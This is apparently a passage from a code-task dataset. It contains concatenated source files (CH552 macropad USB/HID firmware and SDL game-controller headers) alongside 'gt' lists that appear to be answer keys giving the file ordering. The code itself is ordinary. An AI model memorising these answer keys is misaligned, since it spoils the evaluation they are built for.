USB_REPORT_DESCR      ReportDescr\n#define USB_REPORT_DESCR_LEN  ReportDescrLen\n\n\n\n\nextern __code uint16_t LangDescr[];\nextern __code uint16_t ManufDescr[];\nextern __code uint16_t ProdDescr[];\nextern __code uint16_t SerDescr[];\nextern __code uint16_t InterfDescr[];\n\n#define USB_STR_DESCR_i0    (uint8_t*)LangDescr\n#define USB_STR_DESCR_i1    (uint8_t*)ManufDescr\n#define USB_STR_DESCR_i2    (uint8_t*)ProdDescr\n#define USB_STR_DESCR_i3    (uint8_t*)SerDescr\n#define USB_STR_DESCR_i4    (uint8_t*)InterfDescr\n#define USB_STR_DESCR_ix    (uint8_t*)SerDescr\n\n'CH552-MacroPad-plus/software/src/usb_hid.h'\n:\n\n\n\n\n\n\n\n#pragma once\n\n#include <stdint.h>\n\n#include \"usb_handler.h\"\n\n\n\nvoid HID_init(void);\n\nvoid HID_sendReport(__xdata uint8_t* buf, uint8_t len);\n\n\n'CH552-MacroPad-plus/software/src/usb.h'\n:\n\n\n\n#pragma once\n#include <stdint.h>\n\n\n#ifndef USB_PID_SETUP\n#define USB_PID_NULL            0x00\n#define USB_PID_SOF             0x05\n#define USB_PID_SETUP           0x0D\n#define USB_PID_IN              0x09\n#define USB_PID_OUT             0x01\n#define USB_PID_ACK             0x02\n#define USB_PID_NAK             0x0A\n#define USB_PID_STALL           0x0E\n#define USB_PID_DATA0           0x03\n#define USB_PID_DATA1           0x0B\n#define USB_PID_PRE             0x0C\n#endif\n\n\n#ifndef USB_GET_DESCRIPTOR\n#define USB_GET_STATUS          0x00\n#define USB_CLEAR_FEATURE       0x01\n#define USB_SET_FEATURE         0x03\n#define USB_SET_ADDRESS         0x05\n#define USB_GET_DESCRIPTOR      0x06\n#define USB_SET_DESCRIPTOR      0x07\n#define USB_GET_CONFIGURATION   0x08\n#define USB_SET_CONFIGURATION   0x09\n#define USB_GET_INTERFACE       0x0A\n#define USB_SET_INTERFACE       0x0B\n#define USB_SYNCH_FRAME         0x0C\n#endif\n\n\n#ifndef HUB_GET_DESCRIPTOR\n#define HUB_GET_STATUS          0x00\n#define HUB_CLEAR_FEATURE       0x01\n#define HUB_GET_STATE           0x02\n#define HUB_SET_FEATURE         0x03\n#define HUB_GET_DESCRIPTOR      0x06\n#define HUB_SET_DESCRIPTOR      0x07\n#endif\n\n\n#ifndef HID_GET_REPORT\n#define HID_GET_REPORT          0x01\n#define HID_GET_IDLE            0x02\n#define HID_GET_PROTOCOL        0x03\n#define HID_SET_REPORT          0x09\n#define HID_SET_IDLE            0x0A\n#define HID_SET_PROTOCOL        0x0B\n#endif\n\n\n#ifndef USB_REQ_TYP_MASK\n#define USB_REQ_TYP_IN          0x80\n#define USB_REQ_TYP_OUT         0x00\n#define USB_REQ_TYP_READ        0x80\n#define USB_REQ_TYP_WRITE       0x00\n#define USB_REQ_TYP_MASK        0x60\n#define USB_REQ_TYP_STANDARD    0x00\n#define USB_REQ_TYP_CLASS       0x20\n#define USB_REQ_TYP_VENDOR      0x40\n#define USB_REQ_TYP_RESERVED    0x60\n#define USB_REQ_RECIP_MASK      0x1F\n#define USB_REQ_RECIP_DEVICE    0x00\n#define USB_REQ_RECIP_INTERF    0x01\n#define USB_REQ_RECIP_ENDP      0x02\n#define USB_REQ_RECIP_OTHER     0x03\n#endif\n\n\n#ifndef HUB_GET_HUB_DESCRIPTOR\n#define HUB_CLEAR_HUB_FEATURE   0x20\n#define HUB_CLEAR_PORT_FEATURE  0x23\n#define HUB_GET_BUS_STATE       0xA3\n#define HUB_GET_HUB_DESCRIPTOR  0xA0\n#define HUB_GET_HUB_STATUS      0xA0\n#define HUB_GET_PORT_STATUS     0xA3\n#define HUB_SET_HUB_DESCRIPTOR  0x20\n#define HUB_SET_HUB_FEATURE     0x20\n#define HUB_SET_PORT_FEATURE    0x23\n#endif\n\n\n#ifndef HUB_PORT_RESET\n#define HUB_C_HUB_LOCAL_POWER   0\n#define HUB_C_HUB_OVER_CURRENT  1\n#define HUB_PORT_CONNECTION     0\n#define HUB_PORT_ENABLE         1\n#define HUB_PORT_SUSPEND        2\n#define HUB_PORT_OVER_CURRENT   3\n#define HUB_PORT_RESET          4\n#define HUB_PORT_POWER          8\n#define HUB_PORT_LOW_SPEED      9\n#define HUB_C_PORT_CONNECTION   16\n#define HUB_C_PORT_ENABLE       17\n#define HUB_C_PORT_SUSPEND      18\n#define HUB_C_PORT_OVER_CURRENT 19\n#define HUB_C_PORT_RESET        20\n#endif\n\n\n#ifndef USB_DESCR_TYP_DEVICE\n#define USB_DESCR_TYP_DEVICE    0x01\n#define USB_DESCR_TYP_CONFIG    0x02\n#define USB_DESCR_TYP_STRING    0x03\n#define USB_DESCR_TYP_INTERF    0x04\n#define USB_DESCR_TYP_ENDP      0x05\n#define USB_DESCR_TYP_QUALIF    0x06\n#define USB_DESCR_TYP_SPEED     0x07\n#define USB_DESCR_TYP_OTG       0x09\n#define USB_DESCR_TYP_IAD       0x0B\n#define USB_DESCR_TYP_HID       0x21\n#define USB_DESCR_TYP_REPORT    0x22\n#define USB_DESCR_TYP_PHYSIC    0x23\n#define USB_DESCR_TYP_CS_INTF   0x24\n#define USB_DESCR_TYP_CS_ENDP   0x25\n#define USB_DESCR_TYP_HUB       0x29\n#endif\n\n\n#ifndef USB_DEV_CLASS_HUB\n#define USB_DEV_CLASS_RESERVED  0x00\n#define USB_DEV_CLASS_AUDIO     0x01\n#define USB_DEV_CLASS_COMM      0x02\n#define USB_DEV_CLASS_HID       0x03\n#define USB_DEV_CLASS_MONITOR   0x04\n#define USB_DEV_CLASS_PHYSIC_IF 0x05\n#define USB_DEV_CLASS_POWER     0x06\n#define USB_DEV_CLASS_PRINTER   0x07\n#define USB_DEV_CLASS_STORAGE   0x08\n#define USB_DEV_CLASS_HUB       0x09\n#define USB_DEV_CLASS_DATA      0x0A\n#define USB_DEV_CLASS_MISC      0xEF\n#define USB_DEV_CLASS_VENDOR    0xFF\n#endif\n\n\n#ifndef USB_ENDP_TYPE_MASK\n#define USB_ENDP_DIR_MASK       0x80\n#define USB_ENDP_ADDR_MASK      0x0F\n#define USB_ENDP_TYPE_MASK      0x03\n#define USB_ENDP_TYPE_CTRL      0x00\n#define USB_ENDP_TYPE_ISOCH     0x01\n#define USB_ENDP_TYPE_BULK      0x02\n#define USB_ENDP_TYPE_INTER     0x03\n#define USB_ENDP_ADDR_EP1_OUT   0x01\n#define USB_ENDP_ADDR_EP1_IN    0x81\n#define USB_ENDP_ADDR_EP2_OUT   0x02\n#define USB_ENDP_ADDR_EP2_IN    0x82\n#define USB_ENDP_ADDR_EP3_OUT   0x03\n#define USB_ENDP_ADDR_EP3_IN    0x83\n#define USB_ENDP_ADDR_EP4_OUT   0x04\n#define USB_ENDP_ADDR_EP4_IN    0x84\n#endif\n\n#ifndef USB_DEVICE_ADDR\n  #define USB_DEVICE_ADDR       0x02\n#endif\n#ifndef DEFAULT_ENDP0_SIZE\n  #define DEFAULT_ENDP0_SIZE    8\n#endif\n#ifndef DEFAULT_ENDP1_SIZE\n  #define DEFAULT_ENDP1_SIZE    8\n#endif\n#ifndef MAX_PACKET_SIZE\n  #define MAX_PACKET_SIZE       64\n#endif\n#ifndef USB_BO_CBW_SIZE\n  #define USB_BO_CBW_SIZE       0x1F\n  #define USB_BO_CSW_SIZE       0x0D\n#endif\n#ifndef USB_BO_CBW_SIG0\n  #define USB_BO_CBW_SIG0       0x55\n  #define USB_BO_CBW_SIG1       0x53\n  #define USB_BO_CBW_SIG2       0x42\n  #define USB_BO_CBW_SIG3       0x43\n  #define USB_BO_CSW_SIG0       0x55\n  #define USB_BO_CSW_SIG1       0x53\n  #define USB_BO_CSW_SIG2       0x42\n  #define USB_BO_CSW_SIG3       0x53\n#endif\n\n\ntypedef struct _USB_SETUP_REQ {\n    uint8_t  bRequestType;\n    uint8_t  bRequest;\n    uint8_t  wValueL;\n    uint8_t  wValueH;\n    uint8_t  wIndexL;\n    uint8_t  wIndexH;\n    uint8_t  wLengthL;\n    uint8_t  wLengthH;\n} USB_SETUP_REQ, *PUSB_SETUP_REQ;\ntypedef USB_SETUP_REQ __xdata *PXUSB_SETUP_REQ;\n\ntypedef struct _USB_DEVICE_DESCR {\n    uint8_t  bLength;\n    uint8_t  bDescriptorType;\n    uint16_t bcdUSB;\n    uint8_t  bDeviceClass;\n    uint8_t  bDeviceSubClass;\n    uint8_t  bDeviceProtocol;\n    uint8_t  bMaxPacketSize0;\n    uint16_t idVendor;\n    uint16_t idProduct;\n    uint16_t bcdDevice;\n    uint8_t  iManufacturer;\n    uint8_t  iProduct;\n    uint8_t  iSerialNumber;\n    uint8_t  bNumConfigurations;\n} USB_DEV_DESCR, *PUSB_DEV_DESCR;\ntypedef USB_DEV_DESCR __xdata *PXUSB_DEV_DESCR;\n\ntypedef struct _USB_CONFIG_DESCR {\n    uint8_t  bLength;\n    uint8_t  bDescriptorType;\n    uint16_t wTotalLength;\n    uint8_t  bNumInterfaces;\n    uint8_t  bConfigurationValue;\n    uint8_t  iConfiguration;\n    uint8_t  bmAttributes;\n    uint8_t  MaxPower;\n} USB_CFG_DESCR, *PUSB_CFG_DESCR;\ntypedef USB_CFG_DESCR __xdata *PXUSB_CFG_DESCR;\n\ntypedef struct _USB_INTERF_DESCR {\n    uint8_t  bLength;\n    uint8_t  bDescriptorType;\n    uint8_t  bInterfaceNumber;\n    uint8_t  bAlternateSetting;\n    uint8_t  bNumEndpoints;\n    uint8_t  bInterfaceClass;\n    uint8_t  bInterfaceSubClass;\n    uint8_t  bInterfaceProtocol;\n    uint8_t  iInterface;\n} USB_ITF_DESCR, *PUSB_ITF_DESCR;\ntypedef USB_ITF_DESCR __xdata *PXUSB_ITF_DESCR;\n\ntypedef struct _USB_ITF_ASS_DESCR {\n    uint8_t  bLength;\n    uint8_t  bDescriptorType;\n    uint8_t  bFirstInterface;\n    uint8_t  bInterfaceCount;\n    uint8_t  bFunctionClass;\n    uint8_t  bFunctionSubClass;\n    uint8_t  bFunctionProtocol;\n    uint8_t  iFunction;\n} USB_IAD_DESCR, *PUSB_IAD_DESCR;\ntypedef USB_IAD_DESCR __xdata *PXUSB_IAD_DESCR;\n\ntypedef struct _USB_ENDPOINT_DESCR {\n    uint8_t  bLength;\n    uint8_t  bDescriptorType;\n    uint8_t  bEndpointAddress;\n    uint8_t  bmAttributes;\n    uint16_t wMaxPacketSize;\n    uint8_t  bInterval;\n} USB_ENDP_DESCR, *PUSB_ENDP_DESCR;\ntypedef USB_ENDP_DESCR __xdata *PXUSB_ENDP_DESCR;\n\ntypedef struct _USB_CONFIG_DESCR_LONG {\n    USB_CFG_DESCR   cfg_descr;\n    USB_ITF_DESCR   itf_descr;\n    USB_ENDP_DESCR  endp_descr[1];\n} USB_CFG_DESCR_LONG, *PUSB_CFG_DESCR_LONG;\ntypedef USB_CFG_DESCR_LONG __xdata *PXUSB_CFG_DESCR_LONG;\n\ntypedef struct _USB_HUB_DESCR {\n    uint8_t  bDescLength;\n    uint8_t  bDescriptorType;\n    uint8_t  bNbrPorts;\n    uint16_t wHubCharacteristics;\n    uint8_t  bPwrOn2PwrGood;\n    uint8_t  bHubContrCurrent;\n    uint8_t  DeviceRemovable;\n    uint8_t  PortPwrCtrlMask;\n} USB_HUB_DESCR, *PUSB_HUB_DESCR;\ntypedef USB_HUB_DESCR __xdata *PXUSB_HUB_DESCR;\n\ntypedef struct _USB_HID_DESCR {\n    uint8_t  bLength;\n    uint8_t  bDescriptorType;\n    uint16_t bcdHID;\n    uint8_t  bCountryCode;\n    uint8_t  bNumDescriptors;\n    uint8_t  bDescriptorTypeX;\n    uint16_t wDescriptorLength;\n} USB_HID_DESCR, *PUSB_HID_DESCR;\ntypedef USB_HID_DESCR __xdata *PXUSB_HID_DESCR;\n\ntypedef struct _UDISK_BOC_CBW {\n    uint8_t mCBW_Sig0;\n    uint8_t mCBW_Sig1;\n    uint8_t mCBW_Sig2;\n    uint8_t mCBW_Sig3;\n    uint8_t mCBW_Tag0;\n    uint8_t mCBW_Tag1;\n    uint8_t mCBW_Tag2;\n    uint8_t mCBW_Tag3;\n    uint8_t mCBW_DataLen0;\n    uint8_t mCBW_DataLen1;\n    uint8_t mCBW_DataLen2;\n    uint8_t mCBW_DataLen3;\n    uint8_t mCBW_Flag;\n    uint8_t mCBW_LUN;\n    uint8_t mCBW_CB_Len;\n    uint8_t mCBW_CB_Buf[16];\n} UDISK_BOC_CBW, *PUDISK_BOC_CBW;\ntypedef UDISK_BOC_CBW __xdata *PXUDISK_BOC_CBW;\n\ntypedef struct _UDISK_BOC_CSW {\n    uint8_t mCSW_Sig0;\n    uint8_t mCSW_Sig1;\n    uint8_t mCSW_Sig2;\n    uint8_t mCSW_Sig3;\n    uint8_t mCSW_Tag0;\n    uint8_t mCSW_Tag1;\n    uint8_t mCSW_Tag2;\n    uint8_t mCSW_Tag3;\n    uint8_t mCSW_Residue0;\n    uint8_t mCSW_Residue1;\n    uint8_t mCSW_Residue2;\n    uint8_t mCSW_Residue3;\n    uint8_t mCSW_Status;\n} UDISK_BOC_CSW, *PUDISK_BOC_CSW;\ntypedef UDISK_BOC_CSW __xdata *PXUDISK_BOC_CSW;\n\n'CH552-MacroPad-plus/software/src/usb_composite.c'\n:\n\n\n\n\n\n\n\n#include \"usb_composite.h\"\n\n#include \"usb_hid.h\"\n\n#include \"usb_handler.h\"\n\n\n\n#define KBD_sendReport()    HID_sendReport(KBD_report, sizeof(KBD_report))\n\n#define CON_sendReport()    HID_sendReport(CON_report, sizeof(CON_report))\n\n#define JOY_sendReport()    HID_sendReport(JOY_report, sizeof(JOY_report))\n\n#define MOUSE_sendReport()  HID_sendReport(MOUSE_report, sizeof(MOUSE_report))\n\n\n\n\n\n\n\n\n\n__xdata uint8_t KBD_report[]   = {1,0,0,0,0,0,0,0};\n\n__xdata uint8_t CON_report[]   = {2,0,0};\n\n__xdata uint8_t MOUSE_report[] = {3,0,0,0,0};\n\n__xdata uint8_t JOY_report[]   = {4,0,0,0};\n\n\n\n\n\n\n\n\n\n__code uint8_t KBD_map[128] = {\n\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2a, 0x2b, 0x28, 0x00, 0x00, 0x00,\n\n  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n\n  0x00, 0x00, 0x00, 0x00, 0x2c, 0x9e, 0xb4, 0xa0, 0xa1, 0xa2, 0xa4, 0x34, 0xa6, 0xa7,\n\n  0xa5, 0xae, 0x36, 0x2d, 0x37, 0x38, 0x27, 0x1e, 0x1f, 0x20, 0x21, 0x22, 0x23, 0x24,\n\n  0x25, 0x26, 0xb3, 0x33, 0xb6, 0x2e, 0xb7, 0xb8, 0x9f, 0x84, 0x85, 0x86, 0x87, 0x88,\n\n  0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f, 0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96,\n\n  0x97, 0x98, 0x99, 0x9a, 0x9b, 0x9c, 0x9d, 0x2f, 0x31, 0x30, 0xa3, 0xad, 0x35, 0x04,\n\n  0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x12,\n\n  0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0xaf, 0xb1, 0xb0,\n\n  0xb5, 0x00\n\n};\n\n\n\n\n\n\n\n\n\n\n\n\n\nvoid KBD_press(uint8_t key) {\n\n  uint8_t i;\n\n\n\n\n\n  if(key >= 136) key -= 136;\n\n  else if(key >= 128) {\n\n    KBD_report[1] |= (1<<(key-128));\n\n    key = 0;\n\n  }\n\n  else {\n\n    key = KBD_map[key];\n\n    if(!key) return;\n\n    if(key & 0x80) {\n\n      KBD_report[1] |= 0x02;\n\n      key &= 0x7F;\n\n    }\n\n  }\n\n\n\n\n\n  for(i=3; i<8; i++) {\n\n    if(KBD_report[i] == key) return;\n\n  }\n\n\n\n\n\n  for(i=3; i<8; i++) {\n\n    if(KBD_report[i] == 0) {\n\n      KBD_report[i] = key;\n\n      KBD_sendReport();\n\n      return;\n\n    }\n\n  }\n\n}\n\n\n\n\n\nvoid KBD_release(uint8_t key) {\n\n  uint8_t i;\n\n\n\n\n\n  if(key >= 136) key -= 136;\n\n  else if(key >= 128) {\n\n    KBD_report[1] &= ~(1<<(key-128));\n\n    key = 0;\n\n  }\n\n  else {\n\n    key = KBD_map[key];\n\n    if(!key) return;\n\n    if(key & 0x80) {\n\n      KBD_report[1] &= ~0x02;\n\n      key &= 0x7F;\n\n    }\n\n  }\n\n\n\n\n\n  for(i=3; i<8; i++) {\n\n    if(KBD_report[i] == key) KBD_report[i] = 0;\n\n  }\n\n  KBD_sendReport();\n\n}\n\n\n\n\n\nvoid KBD_type(uint8_t key) {\n\n  KBD_press(key);\n\n  KBD_release(key);\n\n}\n\n\n\n\n\nvoid KBD_releaseAll(void) {\n\n  uint8_t i;\n\n  for(i=7; i; i--) KBD_report[i] = 0;\n\n  KBD_sendReport();\n\n}\n\n\n\n\n\nvoid KBD_print(char* str) {\n\n  while(*str) KBD_type(*str++);\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\nvoid CON_press(uint8_t key) {\n\n  CON_report[1] = key;\n\n  CON_sendReport();\n\n}\n\n\n\n\n\nvoid CON_release(void) {\n\n  CON_report[1] = 0;\n\n  CON_sendReport();\n\n}\n\n\n\n\n\nvoid CON_type(uint8_t key) {\n\n  CON_press(key);\n\n  CON_release();\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\nvoid MOUSE_press(uint8_t buttons) {\n\n  MOUSE_report[1] |= buttons;\n\n  MOUSE_sendReport();\n\n}\n\n\n\n\n\nvoid MOUSE_release(uint8_t buttons) {\n\n  MOUSE_report[1] &= ~buttons;\n\n  MOUSE_sendReport();\n\n}\n\n\n\n\n\nvoid MOUSE_move(int8_t xrel, int8_t yrel) {\n\n  MOUSE_report[2] = (uint8_t)xrel;\n\n  MOUSE_report[3] = (uint8_t)yrel;\n\n  MOUSE_sendReport();\n\n  MOUSE_report[2] = 0;\n\n  MOUSE_report[3] = 0;\n\n}\n\n\n\n\n\nvoid MOUSE_wheel(int8_t rel) {\n\n  MOUSE_report[4] = (uint8_t)rel;\n\n  MOUSE_sendReport();\n\n  MOUSE_report[4] = 0;\n\n}\n\n\n\n\n\n\n\n\n\n\n\n\n\nvoid JOY_press(uint8_t buttons) {\n\n  JOY_report[1] |= buttons;\n\n  JOY_sendReport();\n\n}\n\n\n\n\n\nvoid JOY_release(uint8_t buttons) {\n\n  JOY_report[1] &= ~buttons;\n\n  JOY_sendReport();\n\n}\n\n\n\n\n\nvoid JOY_move(int8_t xrel, int8_t yrel) {\n\n  JOY_report[2] = (uint8_t)xrel;\n\n  JOY_report[3] = (uint8_t)yrel;\n\n  JOY_sendReport();\n\n}\n\n\n'CH552-MacroPad-plus/software/src/usb_handler.h'\n:\n\n\n\n#pragma once\n#include <stdint.h>\n#include \"usb_descr.h\"\n\n\n\n\n__xdata __at (EP0_ADDR) uint8_t EP0_buffer[EP0_BUF_SIZE];\n__xdata __at (EP1_ADDR) uint8_t EP1_buffer[EP1_BUF_SIZE];\n__xdata __at (EP2_ADDR) uint8_t EP2_buffer[EP2_BUF_SIZE];\n\n#define USB_setupBuf ((PUSB_SETUP_REQ)EP0_buffer)\nextern uint8_t SetupReq;\n\n\n\n\nvoid HID_setup(void);\nvoid HID_reset(void);\nvoid HID_EP1_IN(void);\nvoid HID_EP2_OUT(void);\n\n\n\n\n\n#define USB_INIT_handler    HID_setup\n#define USB_RESET_handler   HID_reset\n\n\n#define EP0_SETUP_callback  USB_EP0_SETUP\n#define EP0_IN_callback     USB_EP0_IN\n#define EP0_OUT_callback    USB_EP0_OUT\n#define EP1_IN_callback     HID_EP1_IN\n#define EP2_OUT_callback    HID_EP2_OUT\n\n\n\n\nvoid USB_interrupt(void);\nvoid USB_init(void);\n",
        "gt": [
            "'CH552-MacroPad-plus/software/src/usb.h'",
            "'CH552-MacroPad-plus/software/src/usb_descr.h'",
            "'CH552-MacroPad-plus/software/src/usb_handler.h'",
            "'CH552-MacroPad-plus/software/src/usb_hid.h'",
            "'CH552-MacroPad-plus/software/src/usb_composite.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_gamecontroller.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_rwops.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test_compare.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL.h'\n:\n\n\n\n\n#ifndef _SDL_H\n#define _SDL_H\n\n#include \"SDL_main.h\"\n#include \"SDL_stdinc.h\"\n#include \"SDL_assert.h\"\n#include \"SDL_atomic.h\"\n#include \"SDL_audio.h\"\n#include \"SDL_clipboard.h\"\n#include \"SDL_cpuinfo.h\"\n#include \"SDL_endian.h\"\n#include \"SDL_error.h\"\n#include \"SDL_events.h\"\n#include \"SDL_filesystem.h\"\n#include \"SDL_joystick.h\"\n#include \"SDL_gamecontroller.h\"\n#include \"SDL_haptic.h\"\n#include \"SDL_hints.h\"\n#include \"SDL_loadso.h\"\n#include \"SDL_log.h\"\n#include \"SDL_messagebox.h\"\n#include \"SDL_mutex.h\"\n#include \"SDL_power.h\"\n#include \"SDL_render.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_system.h\"\n#include \"SDL_thread.h\"\n#include \"SDL_timer.h\"\n#include \"SDL_version.h\"\n#include \"SDL_video.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n\n#define SDL_INIT_TIMER          0x00000001u\n#define SDL_INIT_AUDIO          0x00000010u\n#define SDL_INIT_VIDEO          0x00000020u\n#define SDL_INIT_JOYSTICK       0x00000200u\n#define SDL_INIT_HAPTIC         0x00001000u\n#define SDL_INIT_GAMECONTROLLER 0x00002000u\n#define SDL_INIT_EVENTS         0x00004000u\n#define SDL_INIT_NOPARACHUTE    0x00100000u\n#define SDL_INIT_EVERYTHING ( \\\n                SDL_INIT_TIMER | SDL_INIT_AUDIO | SDL_INIT_VIDEO | SDL_INIT_EVENTS | \\\n                SDL_INIT_JOYSTICK | SDL_INIT_HAPTIC | SDL_INIT_GAMECONTROLLER \\\n            )\n\n\n\nextern DECLSPEC int SDLCALL SDL_Init(Uint32 flags);\n\n\nextern DECLSPEC int SDLCALL SDL_InitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_QuitSubSystem(Uint32 flags);\n\n\nextern DECLSPEC Uint32 SDLCALL SDL_WasInit(Uint32 flags);\n\n\nextern DECLSPEC void SDLCALL SDL_Quit(void);\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_test.h'\n:\n\n\n\n#ifndef _SDL_test_h\n#define _SDL_test_h\n\n#include \"SDL.h\"\n#include \"SDL_test_common.h\"\n#include \"SDL_test_font.h\"\n#include \"SDL_test_random.h\"\n#include \"SDL_test_fuzzer.h\"\n#include \"SDL_test_crc32.h\"\n#include \"SDL_test_md5.h\"\n#include \"SDL_test_log.h\"\n#include \"SDL_test_assert.h\"\n#include \"SDL_test_harness.h\"\n#include \"SDL_test_images.h\"\n#include \"SDL_test_compare.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\n#define SDLTEST_MAX_LOGMESSAGE_LENGTH   3584\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_gamecontroller.h'\n:\n\n\n\n#ifndef _SDL_gamecontroller_h\n#define _SDL_gamecontroller_h\n\n#include \"SDL_stdinc.h\"\n#include \"SDL_error.h\"\n#include \"SDL_rwops.h\"\n#include \"SDL_joystick.h\"\n\n#include \"begin_code.h\"\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\n\n\nstruct _SDL_GameController;\ntypedef struct _SDL_GameController SDL_GameController;\n\n\ntypedef enum\n{\n    SDL_CONTROLLER_BINDTYPE_NONE = 0,\n    SDL_CONTROLLER_BINDTYPE_BUTTON,\n    SDL_CONTROLLER_BINDTYPE_AXIS,\n    SDL_CONTROLLER_BINDTYPE_HAT\n} SDL_GameControllerBindType;\n\n\ntypedef struct SDL_GameControllerButtonBind\n{\n    SDL_GameControllerBindType bindType;\n    union\n    {\n        int button;\n        int axis;\n        struct {\n            int hat;\n            int hat_mask;\n        } hat;\n    } value;\n\n} SDL_GameControllerButtonBind;\n\n\n\n\n\nextern DECLSPEC int SDLCALL SDL_GameControllerAddMappingsFromRW( SDL_RWops * rw, int freerw );\n\n\n#define SDL_GameControllerAddMappingsFromFile(file)   SDL_GameControllerAddMappingsFromRW(SDL_RWFromFile(file, \"rb\"), 1)\n\n\nextern DECLSPEC int SDLCALL SDL_GameControllerAddMapping( const char* mappingString );\n\n\nextern DECLSPEC char * SDLCALL SDL_GameControllerMappingForGUID( SDL_JoystickGUID guid );\n\n\nextern DECLSPEC char * SDLCALL SDL_GameControllerMapping( SDL_GameController * gamecontroller );\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_IsGameController(int joystick_index);\n\n\n\nextern DECLSPEC const char *SDLCALL SDL_GameControllerNameForIndex(int joystick_index);\n\n\nextern DECLSPEC SDL_GameController *SDLCALL SDL_GameControllerOpen(int joystick_index);\n\n\nextern DECLSPEC SDL_GameController *SDLCALL SDL_GameControllerFromInstanceID(SDL_JoystickID joyid);\n\n\nextern DECLSPEC const char *SDLCALL SDL_GameControllerName(SDL_GameController *gamecontroller);\n\n\nextern DECLSPEC SDL_bool SDLCALL SDL_GameControllerGetAttached(SDL_GameController *gamecontroller);\n\n\nextern DECLSPEC SDL_Joystick *SDLCALL SDL_GameControllerGetJoystick(SDL_GameController *gamecontroller);\n\n\nextern DECLSPEC int SDLCALL SDL_GameControllerEventState(int state);\n\n\nextern DECLSPEC void SDLCALL SDL_GameControllerUpdate(void);\n\n\n\ntypedef enum\n{\n    SDL_CONTROLLER_AXIS_INVALID = -1,\n    SDL_CONTROLLER_AXIS_LEFTX,\n    SDL_CONTROLLER_AXIS_LEFTY,\n    SDL_CONTROLLER_AXIS_RIGHTX,\n    SDL_CONTROLLER_AXIS_RIGHTY,\n    SDL_CONTROLLER_AXIS_TRIGGERLEFT,\n    SDL_CONTROLLER_AXIS_TRIGGERRIGHT,\n    SDL_CONTROLLER_AXIS_MAX\n} SDL_GameControllerAxis;\n\n\nextern DECLSPEC SDL_GameControllerAxis SDLCALL SDL_GameControllerGetAxisFromString(const char *pchString);\n\n\nextern DECLSPEC const char* SDLCALL SDL_GameControllerGetStringForAxis(SDL_GameControllerAxis axis);\n\n\nextern DECLSPEC SDL_GameControllerButtonBind SDLCALL\nSDL_GameControllerGetBindForAxis(SDL_GameController *gamecontroller,\n                                 SDL_GameControllerAxis axis);\n\n\nextern DECLSPEC Sint16 SDLCALL\nSDL_GameControllerGetAxis(SDL_GameController *gamecontroller,\n                          SDL_GameControllerAxis axis);\n\n\ntypedef enum\n{\n    SDL_CONTROLLER_BUTTON_INVALID = -1,\n    SDL_CONTROLLER_BUTTON_A,\n    SDL_CONTROLLER_BUTTON_B,\n    SDL_CONTROLLER_BUTTON_X,\n    SDL_CONTROLLER_BUTTON_Y,\n    SDL_CONTROLLER_BUTTON_BACK,\n    SDL_CONTROLLER_BUTTON_GUIDE,\n    SDL_CONTROLLER_BUTTON_START,\n    SDL_CONTROLLER_BUTTON_LEFTSTICK,\n    SDL_CONTROLLER_BUTTON_RIGHTSTICK,\n    SDL_CONTROLLER_BUTTON_LEFTSHOULDER,\n    SDL_CONTROLLER_BUTTON_RIGHTSHOULDER,\n    SDL_CONTROLLER_BUTTON_DPAD_UP,\n    SDL_CONTROLLER_BUTTON_DPAD_DOWN,\n    SDL_CONTROLLER_BUTTON_DPAD_LEFT,\n    SDL_CONTROLLER_BUTTON_DPAD_RIGHT,\n    SDL_CONTROLLER_BUTTON_MAX\n} SDL_GameControllerButton;\n\n\nextern DECLSPEC SDL_GameControllerButton SDLCALL SDL_GameControllerGetButtonFromString(const char *pchString);\n\n\nextern DECLSPEC const char* SDLCALL SDL_GameControllerGetStringForButton(SDL_GameControllerButton button);\n\n\nextern DECLSPEC SDL_GameControllerButtonBind SDLCALL\nSDL_GameControllerGetBindForButton(SDL_GameController *gamecontroller,\n                                   SDL_GameControllerButton button);\n\n\n\nextern DECLSPEC Uint8 SDLCALL SDL_GameControllerGetButton(SDL_GameController *gamecontroller,\n                                                          SDL_GameControllerButton button);\n\n\nextern DECLSPEC void SDLCALL SDL_GameControllerClose(SDL_GameController *gamecontroller);\n\n\n\n#ifdef __cplusplus\n}\n#endif\n#include \"close_code.h\"\n\n#endif\n\n\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/SDL/SDL_rwops.h'\n:\n\n\n\n#ifndef _SDL_rwops_h\n#define 